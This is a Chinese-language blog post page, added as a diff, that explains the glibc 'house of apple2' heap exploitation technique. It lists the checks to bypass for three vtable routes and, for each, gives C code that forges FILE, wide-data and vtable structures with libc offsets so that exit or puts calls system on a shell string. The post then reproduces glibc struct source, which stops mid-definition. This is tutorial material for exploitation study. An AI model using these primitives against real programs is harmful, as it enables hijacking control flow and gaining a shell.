@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>house of apple2 | Mr.BW的blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">house of apple2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 8, 2025&nbsp;&nbsp;23:08:52</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="house-of-apple-2"><a href="#house-of-apple-2" class="headerlink" title="house of apple 2"></a>house of apple 2</h1><p>伪造<code>_IO_FILE</code>结构体，伪造<code>vtable</code>控制程序执行流。但<code>_IO_FILE</code>中<code>table</code>存在合法性检查，即取值只能为已有的几个虚表指针，因此直接伪造<code>_IO_FILE</code>结构体中的<code>vtable</code>为目的地址往往无法通过合法性检查。</p>
+<p><code>_IO_FILE</code>中存在指向<code>_IO_wide_data</code>结构体的指针，这个结构体专门用于处理宽字符。<code>_IO_wide_data</code>结构与<code>_IO_FILE</code>类似，也存在<code>vtable</code>不过此处的<code>vtable</code>没有合法性检查，因此可以把此处的<code>vtable</code>为造成需要执行的目标地址，即可实现跳转</p>
+<p>因此，实现<code>house of apple 2</code>需要三块堆来实现攻击</p>
+<ol>
+<li>fake _IO_FILE</li>
+<li>fake _IO_wide_data</li>
+<li>fake _wide_vtable</li>
+</ol>
+<p>不过部分题目能申请到足够大的堆也可以把这三个合并到一个堆来进行构造，只要满足攻击条件即可</p>
+<p>下面三种路线均可实现，但只推荐第一种。后面两种所需的vtable无符号不方便寻找</p>
+<h2 id="IO-wfile-overflow路线"><a href="#IO-wfile-overflow路线" class="headerlink" title="_IO_wfile_overflow路线"></a>_IO_wfile_overflow路线</h2><p><code>_IO_wfile_jumps、_IO_wfile_jumps_mmap、_IO_wfile_jumps_maybe_mmap</code>虚表指针均会去调用<code>_IO_wfile_overflow</code></p>
+<p>下为<code>_IO_wfile_overflow</code>攻击路线</p>
+<ul>
+<li>FILE-&gt;mode &#x3D; 0 (_IO_flush_all_lockp 控制流判断条件)</li>
+<li>FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件)</li>
+<li>FILE-&gt;_flags &amp; 0x8 &#x3D;&#x3D; 0 (_IO_wfile_overflow 控制流判断条件，注意_flags在FILE结构体最开头，与binsh字符串重合，因此不能直接写’&#x2F;bin&#x2F;sh’，本程序写入的是’  sh’)</li>
+<li>FILE-&gt;_flags &amp; 0x800 &#x3D;&#x3D; 0 (_IO_wfile_overflow 控制流判断条件)</li>
+<li>FILE-&gt;_wode_data-&gt;_IO_write_base &#x3D;&#x3D; 0 (_IO_wfile_overflow 控制流判断条件，_IO_write_base偏移0x18)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_buf_base &#x3D;&#x3D; 0 (_IO_wdoallocbuf 控制流判断条件)</li>
+<li>FILE-&gt;_flags &amp; 2 !&#x3D; 0 (_IO_wdoallocbuf 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_wide_vtable + 0x68 &#x3D;&#x3D; 要执行的代码地址 (ALLOCATE函数指针偏移0x68)</li>
+</ul>
+<p>c语言伪造实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x2160C0</span>; <span class="comment">// vtable, 0x215F40, 0x216000</span></span><br><span class="line">fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x18</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">*(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里有几点说明</p>
+<ul>
+<li>_IO_wfile_overflow并不是在某些函数中特定调用的而是把_wide_vtable设置成<code>_IO_wfile_jumps、_IO_wfile_jumps_mmap、_IO_wfile_jumps_maybe_mmap</code>其一后调用标准库函数会自动去调用</li>
+<li>house of apple2攻击需要标准库的函数对伪造的FILE结构体进行操作，syscall的系统调用无法完成攻击</li>
+<li>FILE-&gt;vtable 即 FILE+0xD8</li>
+<li>FILE-&gt;_wide_data即FILE+0xA0</li>
+<li>_wide_data-&gt;_wide_table即 _wide_data+0xE0</li>
+<li>FILE-&gt;mode&#x3D;0 时，程序会去处理宽字符，即调用<code>_wide_data</code>，当作宽字符处理数据，之后就可以去调用<code>_wide_data</code>相关内容</li>
+<li>结构体不是必须从heap中伪造，如果能申请到stdin，stdout，stderr等也可进行伪造。例如puts等输出函数会去调用stdout的虚表。或利用largebin attack，unsortedbin attack等去修改<code>_IO_list_all</code>使其指向伪造的FILE，之后通过exit的<code>_IO_flush_all_lockp</code>去调用伪造的FILE的vtable</li>
+<li>跳转到目标地址时<ul>
+<li>rdi:  FILE-&gt;flags 这里如果调用的是<code>system</code>，就不能用<code>/bin/sh</code>了不然无法绕过检查，这里flags的参数可以是<code>  &quot;  sh&quot;</code>带两个空格即可绕过检查</li>
+<li>rdx: FILE-&gt;_wide_data 这里_wide_data+0xa0可以结合setcontext + 61来控制栈进而执行gadget</li>
+</ul>
+</li>
+</ul>
+<p>如图，调用目标地址时rdi和rdx如下，stdout为FILE</p>
+<p><img src="/../image/houseofapple2/1.png" alt="1"></p>
+<p><img src="/../image/houseofapple2/2.png" alt="2"></p>
+<p>函数调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0   0x7f8eb9e83b9b _IO_wdoallocbuf+43</span><br><span class="line">  1   0x7f8eb9e865f5 _IO_wfile_overflow+613</span><br><span class="line">  2   0x7f8eb9e8398f _IO_wdefault_xsputn+95</span><br><span class="line">  3   0x7f8eb9e868a9 _IO_wfile_xsputn+105</span><br><span class="line">  4   0x7f8eb9e80f1c puts+204</span><br></pre></td></tr></table></figure>
+
+<h2 id="IO-wfile-underflow-mmap路线"><a href="#IO-wfile-underflow-mmap路线" class="headerlink" title="_IO_wfile_underflow_mmap路线"></a>_IO_wfile_underflow_mmap路线</h2><p><code>_IO_wfile_jumps_mmap</code>会调用<code>_IO_wfile_underflow_mmap</code></p>
+<ul>
+<li>FILE-&gt;mode &#x3D; 0 (_IO_flush_all_lockp 控制流判断条件)</li>
+<li>FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件)</li>
+<li>FILE-&gt;_flag &amp; 4 &#x3D;&#x3D; 0 (_IO_wfile_underflow_mmap 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_read_ptr &gt;&#x3D; FILE-&gt;_wide_data-&gt;_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)</li>
+<li>FILE-&gt;_IO_read_ptr &lt; FILE-&gt;_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_buf_base &#x3D;&#x3D; NULL (_IO_wfile_underflow_mmap 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_save_base &#x3D;&#x3D; NULL (_IO_wfile_underflow_mmap 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_buf_base &#x3D;&#x3D; 0 (_IO_wdoallocbuf 控制流判断条件)</li>
+<li>FILE-&gt;_flags &amp; 2 !&#x3D; 0 (_IO_wdoallocbuf 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_wide_vtable + 0x68 &#x3D;&#x3D; 要执行的代码地址 (ALLOCATE函数指针偏移0x68)</li>
+</ul>
+<p>c语言伪造实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">fake_FILE-&gt;_IO_read_end = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x216000</span>; <span class="comment">// vtable</span></span><br><span class="line">fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">*(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="IO-wdefault-xsgetn-路线"><a href="#IO-wdefault-xsgetn-路线" class="headerlink" title="_IO_wdefault_xsgetn 路线"></a>_IO_wdefault_xsgetn 路线</h2><p><code> _IO_helper_jumps，_IO_wmem_jumps，_IO_wstr_jumps，_IO_wstrn_jumps</code>均可调用<code>_IO_wdefault_xsgetn</code></p>
+<ul>
+<li>FILE-&gt;mode &gt; 0 (_IO_flush_all_lockp 控制流判断条件，__wunderflow 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_write_ptr &gt; FILE-&gt;_wide_data-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件，_IO_switch_to_wget_mode 控制流判断条件)</li>
+<li>rdx !&#x3D; 0 (_IO_wdefault_xsgetn 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_IO_read_end - FILE-&gt;_wide_data-&gt;_IO_read_ptr &lt;&#x3D; 0 (_IO_wdefault_xsgetn 控制流判断条件)</li>
+<li>FILE-&gt;_flags &amp; 0x800 !&#x3D; 0 (__wunderflow 控制流判断条件)</li>
+<li>FILE-&gt;_wide_data-&gt;_wide_vtable + 0x18 &#x3D;&#x3D; 要执行的代码地址 (OVERFLOW函数指针偏移0x18)</li>
+</ul>
+<p>c语言伪造实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_FILE-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215AC0</span> + <span class="number">0x28</span>; <span class="comment">// vtable</span></span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;     <span class="comment">// _wide_data-&gt;_IO_write_ptr, o+0x20</span></span><br><span class="line">fake_vtable[<span class="number">0x18</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WOVERFLOW调用的函数指针</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh2);       <span class="comment">// sh =&gt; 0x6873, 0x6873 &amp; 0x800 != 0</span></span><br><span class="line"></span><br><span class="line">*(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="相关结构体源码"><a href="#相关结构体源码" class="headerlink" title="相关结构体源码"></a>相关结构体源码</h1><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>去掉了#if不满足的部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">/usr/include/bits/types/struct_FILE.h</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2:<span class="number">24</span>;</span><br><span class="line">  <span class="comment">/* Fallback buffer to use when malloc fails to allocate one.  */</span></span><br><span class="line">  <span class="type">char</span> _short_backupbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **_<span class="title">prevchain</span>;</span></span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">  <span class="type">int</span> _unused3;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__uint64_t</span> _total_written;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">12</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">5</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *)];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">glibc libio/libio.h </span><br><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="IO_FILE_plus"></a>IO_FILE_plus</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">glibc libio/libioP.h</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file; <span class="comment">/* typedef struct _IO_FILE FILE; */</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="IO_jump_t"></a>IO_jump_t</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">glibc libio/libioP.h</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, 